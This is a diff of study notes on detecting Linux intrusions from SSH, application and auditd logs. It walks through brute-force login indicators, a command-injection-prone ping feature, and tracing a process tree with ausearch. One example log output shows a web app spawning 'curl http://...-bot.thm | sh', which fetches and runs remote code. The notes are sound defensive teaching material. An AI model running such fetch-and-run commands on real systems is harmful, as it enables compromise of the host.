@@ -110,9 +110,10 @@ Scenario:
 An IT administrator enables public SSH access to the server, allows password-based authentication, and sets a weak password for one of the support users. 
 Combined, these three actions inevitably lead to an SSH breach, as it's a matter of time before threat actors guess the password. 
 The log sample below shows such a compromise: A brute force followed by a password breach. 
-There are three indicators of malicious logins to pay attention to:
 
-<img width="933" height="193" alt="image" src="https://github.com/user-attachments/assets/32068c9c-f361-4670-9f7a-ae732b47d4d9" />
+![image](https://github.com/user-attachments/assets/eba41aea-ad07-47f0-b7db-f0c2c51cbe9d)
+
+There are three indicators of malicious logins to pay attention to:
 
 &nbsp;
 
@@ -122,7 +123,8 @@ There are three indicators of malicious logins to pay attention to:
 - Why it looks benign: Uses public-key authentication, source IP is internal, login occurs at an exact, consistent time (14:00), matches typical automation behavior
 - Still required: Confirm the IP belongs to an Ansible server, review post-login activity for anomalies
 
-<img width="1095" height="115" alt="image" src="https://github.com/user-attachments/assets/a4e4a4ff-5841-4aaa-a288-a30c47370a51" />
+Successful SSH Logins: <br>
+![image](https://github.com/user-attachments/assets/3e200a22-d5c6-45f9-a830-dfa933930420)
 
 2. Suspicious Password-Based Logins: 
 `Accepted password for jsmith from 54.155.224.201`
@@ -168,7 +170,7 @@ There are three indicators of malicious logins to pay attention to:
 • CVE in Palo Alto firewalls: Granted attackers full control over the Linux-based firewall's OS
 • WordPress "plugins" feature: Often abused to upload malware like web shells to the system
 
-<img width="939" height="147" alt="image" src="https://github.com/user-attachments/assets/823529cf-0283-4207-a509-08abe554a1ac" />
+![image](https://github.com/user-attachments/assets/e6f7c011-5365-4457-911f-12b4a5be74e5)
 
 ## Using Application Logs
 
@@ -195,7 +197,7 @@ There are three indicators of malicious logins to pay attention to:
 - Backend executes: `ping -c 2 [USER_INPUT]`
 - No input filtering or sanitization is applied and so the design is vulnerable to command injection.
 
-<img width="855" height="186" alt="image" src="https://github.com/user-attachments/assets/8de900f2-e1f1-4a8e-a342-ea6829047129" />
+![image](https://github.com/user-attachments/assets/09d2d567-ee4c-4f0f-a1e8-6adfe7280160)
 
 &nbsp;
 
@@ -233,7 +235,7 @@ There are three indicators of malicious logins to pay attention to:
 - Key question `Was this executed by an admin? or by a compromised service or application?`
 - To answer this, you find the command in the logs, trace it up the process tree, identify the true origin
 
-<img width="912" height="263" alt="image" src="https://github.com/user-attachments/assets/20abdc1b-cddd-41b4-b39a-eb1d86253c81" />
+![image](https://github.com/user-attachments/assets/c0c833b3-e8b1-4bcc-a50e-21efde311e08)
 
 &nbsp;
 
@@ -245,24 +247,31 @@ Step 1: Locate the Suspicious Command
   - Search Auditd logs for the command execution: `ausearch -i -x whoami`
   - example output:
 
-<img width="1207" height="88" alt="image" src="https://github.com/user-attachments/assets/b5a33c45-3450-4a66-a560-d7d3f434c1a8" />
+```
+ubuntu@thm-vm:~$ ausearch -i -x whoami # -x filters the results by the command name
+type=PROCTITLE msg=audit(08/25/25 16:28:18.107:985) : proctitle=whoami
+type=SYSCALL msg=audit(08/25/25 16:28:18.107:985) : syscall=execve success=yes exit=0 items=2 ppid=3905 pid=3907 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/whoami key=exec
+
+ubuntu@thm-vm:~$ ausearch -i --pid 3905 # 3905 is a parent process ID of whoami
+type=PROCTITLE msg=audit(08/25/25 16:28:17.101:983) : proctitle=/bin/sh -c whoami
+type=SYSCALL msg=audit(08/25/25 16:28:17.101:983) : syscall=execve success=yes exit=0 items=2 ppid=3898 pid=3905 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/dash key=exec
+
+ubuntu@thm-vm:~$ ausearch -i --pid 3898 # 3898 is a grandparent process ID of whoami
+type=PROCTITLE msg=audit(08/25/25 16:28:11.727:982) : proctitle=/usr/bin/python3 /opt/mywebapp/app.py
+type=SYSCALL msg=audit(08/25/25 16:28:11.727:982) : syscall=execve success=yes exit=0 items=2 ppid=1 pid=3898 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/python3.12 key=exec
+```
 
 - Key fields: `pid` → Process ID of whoami and `ppid` → Parent process ID
 
 Step 2: Walk Up the Process Tree (Parent)
 - Trace the parent process using the ppid: `ausearch -i --pid 3905`
-- example output:
-
-<img width="1213" height="86" alt="image" src="https://github.com/user-attachments/assets/d520b468-671a-46ad-8a7e-7c579a9b2953" />
 
 - whoami was executed via /bin/sh
 - Suggests command execution, not an interactive login
 
 Step 3: Identify the Grandparent Process
 - Continue tracing upward: ausearch -i --pid 3898
-- example output:
-<img width="1188" height="88" alt="image" src="https://github.com/user-attachments/assets/253cffa8-6ce3-4500-81eb-2951dc2aba2f" />
-
+  
 - `whoami` originated from a Python web application
 - The app is a strong candidate for Initial Access
 
@@ -272,7 +281,13 @@ Step 3: Identify the Grandparent Process
 Step 4: Hunt for Stronger evidence
 - List all child processes of the app: `ausearch -i --ppid 3898 | grep 'proctitle'`
 - example output:
-<img width="1096" height="88" alt="image" src="https://github.com/user-attachments/assets/ba1af751-6acb-4bed-989f-45a851bd7313" />
+```
+ubuntu@thm-vm:~$ ausearch -i --ppid 3898 | grep 'proctitle' # Use grep for a simpler output
+type=PROCTITLE msg=audit(08/25/25 16:28:17.101:983) : proctitle=/bin/sh -c whoami
+type=PROCTITLE msg=audit(08/25/25 16:28:18.230:985) : proctitle=/bin/sh -c ls -la
+type=PROCTITLE msg=audit(08/25/25 16:28:19.765:987) : proctitle=/bin/sh -c curl http://17gs9q1puh8o-bot.thm | sh
+[...]
+```
 
 Clear Indicators of Compromise
 - Red flags confirming a service breach:
@@ -339,7 +354,7 @@ Detection Workflow
   - Human mistake?
   - Clear indicator of compromise?
 
-<img width="947" height="192" alt="image" src="https://github.com/user-attachments/assets/29a6e68c-f569-419d-833b-9bfff09f9750" />
+![image](https://github.com/user-attachments/assets/d44559d7-124e-4f91-a20e-4b7e054b96cd)
 
 &nbsp;
 
